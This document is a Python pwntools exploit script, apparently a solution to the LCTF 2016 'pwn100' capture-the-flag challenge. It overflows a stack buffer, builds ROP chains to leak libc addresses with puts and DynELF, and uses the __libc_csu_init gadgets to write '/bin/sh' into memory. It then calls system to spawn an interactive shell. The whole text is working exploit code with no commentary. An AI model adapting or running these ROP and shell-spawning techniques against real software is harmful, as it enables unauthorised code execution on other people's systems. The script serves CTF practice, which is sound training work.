from pwn import*
p = process('./lctf16-pwn100')
elf= ELF('./lctf16-pwn100')

pop_rdi = 0x0000000000400763
puts_plt = elf.symbols['puts']
puts_got = elf.got['puts']
read_got = elf.got['read']
start = 0x0000000000400550
main = 0x00000000004006B8

_csu_pop6 = 0x000000000040075A
#rbx rbp r12 r13 r14 r15 let rbx=0 rbp=1
_csu_mvcall = 0x0000000000400740
#mov edi=r15 rsi=r14 rdx=r13
#call (r12,rbx,8)
data_add = 0x00600000

junk = 'a'*(0x40+8)
junk2 = 'a'*200
def leak(address):
  count = 0
  data = ''
  payload = junk
  payload += p64(pop_rdi) + p64(address)
  payload += p64(puts_plt)
  payload += p64(start)
  payload += junk2
  p.send(payload)
  print p.recvuntil('bye~n')
  up = ""
  while True:
    c = p.recv(numb=1, timeout=1)
    count += 1
    if up == 'n' and c == "":
      data = data[:-1]
      data += "x00"
      break
    else:
      data += c
    up = c
  data = data[:4]
  log.info("%#x => %s" % (address, (data or '').encode('hex')))
  return data
d=DynELF(leak,elf=ELF('./lctf16-pwn100'))
system = d.lookup('system','libc')
print "-------------system address is "+hex(system)

print "-------------write \"/bin/sh\" in the  memory--------------------"
payload = junk + p64(_csu_pop6)
payload += p64(0) + p64(1) + p64(read_got) + p64(8) + p64(data_add) + p64(0)
payload += p64(_csu_mvcall) 
payload += 'a'*0x38
payload += p64(start)
payload +=junk2
p.send(payload)
print p.recvuntil('bye~n')
p.send("/bin/sh\x00")

print "-------------------------get shell-------------------------------"
payload1 = junk + p64(pop_rdi) + p64(data_add) + p64(system) + p64(main)
payload1 += junk2
p.send(payload1)
p.interactive()
p.send()

